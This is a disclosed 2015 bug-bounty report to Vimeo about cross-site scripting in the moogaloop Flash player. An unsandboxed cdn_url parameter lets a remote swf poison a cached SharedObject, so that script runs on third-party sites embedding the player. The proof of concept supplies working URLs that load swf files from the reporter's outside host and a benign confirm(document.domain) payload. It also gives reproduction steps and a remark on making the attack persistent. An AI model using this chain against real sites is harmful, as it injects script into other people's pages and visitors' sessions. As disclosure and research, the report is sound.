@@ -1,0 +1,70 @@
+ReportLink:https://hackerone.com/reports/44512
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/batram
+ReportedTo:Vimeo(vimeo)
+BountyAmount:1000.0
+Severity:
+State:Closed
+DateOfDisclosure:22.02.2015 0:10:26
+
+Summary:
+
+The moogaloop flash player includes in most cases http://f.vimeocdn.com/p/flash/moogaloop/6.0.30/controllers/videoControllerProgressive.swf. In that flash file we can find functionality that looks into the SharedObject "com.conviva.livePass" for recently loaded swf-URLs under the key "lastSwfUrls". As far as I understand it, this is intended to look up if a flash file has been recently been loaded and should be in the cache of the browser, to try to always hit the cached file even if the URLs vary. 
+
+For example an normal request to moogaloop would result in the following:
+
+    opening: http://f.vimeocdn.com/p/flash/moogaloop/6.0.31/moogaloop.swf?clip_id=38626783&autoplay=true
+     => loads: http://f.vimeocdn.com/p/flash/moogaloop/6.0.31/controllers/videoControllerProgressive.swf
+      => videoControllerProgressive.swf looks up https://livepass.conviva.com in SharedObject
+      => if nothing is there, it loads for example https://livepassdl.conviva.com/ver/2.88.0.23377/LivePassModuleMain.swf
+        => and saves that value in the SharedObject
+      => else if an entry matches it will load the value stored in the SharedObject
+
+SharedObjects in Flash are stored on the basis of the domain of the flash file, so in this case the file will always be stored in f.vimeocdn.com/com.conviva.livePass.sol. Using a vulnerability in moogaloop, we can set the SharedObject and get any flash file loaded we want. Resulting in XSS on any site that includes the moogaloop flash player via the deprecated embed code and not the iframe solution.
+ 
+Since your bug bounty has been nothing but awesome and you seem to fix stuff near the speed of light,  I'm not going to report this problem to others that are affected and also run bug-bounties.
+
+examples:
+http://googledevelopers.blogspot.de/2008/06/code-review-io-videos-gears-release-app.html
+https://blog.etsy.com/en/2011/no-place-like-here-pass-the-baton/
+http://www.magentocommerce.com/knowledge-base/entry/screencast-google-base-integration-in-magento
+https://github.com/blog/561 [blocked by Content Security Policy]
+
+PoC:
+**I was confused by the fact that this example only worked occasionally, until I realized that the functionality relies on the injected file being in the cache. So if you are using debugging tools like the browser console, make sure that the browser cache is not disabled.**
+
+Setting the SharedObject:
+http://f.vimeocdn.com/p/flash/moogaloop/6.0.30/moogaloop.swf?cdn_url=https://batr.am/exmp/v/10ece191bd6f4806ed0e7a165931a890a47ea250//set_shared_con.swf%3f
+
+ActionScript source:
+https://batr.am/exmp/v/10ece191bd6f4806ed0e7a165931a890a47ea250//set_shared_con.swc
+
+We use an Unsanboxed Flash Inclusion problem in moogaloop.swf, to load set_shared_con.swf into the SecurityDomain of f.vimeocdn.com, from where we can set the SharedObject. At start up moogaloop tries to load videoControllerProgressive.swf, if the parameter cdn_url is set, it replaces the normal cdn-path and we can load any flash file we want. set_shared_con.swf also loads http://batr.am/t2.swf once to make sure that it lands in the browser cache. The flash file http://batr.am/t2.swf simply executes the follwoing JavaScript:
+
+    confirm('moin: ' + document.domain)
+    
+With the SharedObject set we can now open any site that includes the moogaloop flash player and as soon as the video plays our JavaScript should be executed.
+
+example 1:
+1. open http://f.vimeocdn.com/p/flash/moogaloop/6.0.30/moogaloop.swf?cdn_url=https://batr.am/exmp/v/10ece191bd6f4806ed0e7a165931a890a47ea250//set_shared_con.swf%3f
+ * wait a bit for everything to load (there should be a confirm-dialog urging you to continue)
+2. open http://f.vimeocdn.com/p/flash/moogaloop/6.0.31/moogaloop.swf?clip_id=38626783&autoplay=true
+
+example 2:
+1. open http://f.vimeocdn.com/p/flash/moogaloop/6.0.30/moogaloop.swf?cdn_url=https://batr.am/exmp/v/10ece191bd6f4806ed0e7a165931a890a47ea250//set_shared_con.swf%3f
+ * wait a bit for everything to load (there should be a confirm-dialog urging you to continue)
+2. open http://batr.am/exmp/v/10ece191bd6f4806ed0e7a165931a890a47ea250/vimeo.html
+  * this site contains the Embed Code from http://developer.vimeo.com/player/embedding only with VIDEO_ID replaced.
+3. click on the video to start it
+ * Our flash file is only loaded when the video starts playing and the default Embed Code is not set to autoplay.
+  
+The SharedObject gets overwritten when the video plays. So this example only works once after we set the malicious values. In a real exploit it would be no problem to make it permanent by resetting the value via our flash file that is included when the video plays.
+  
+  
+Tested in:
+Win 8.1 | Google Chrome 41.0.2272.3 (dev-m) | Flash plugin 16.0.0.257
+Mac OS X 10.9.5 | Mozilla Firefox 35.0 | Flash plugin 16.0.0.235
+Mac OS X 10.9.5 | Google Chrome 39.0.2171.99 | Flash plugin 16.0.0.257
+
+Sometimes weirdly crashes/hangs in:
+Win 8.1 | Mozilla Firefox 35.0 | Flash plugin 16,0,0,235
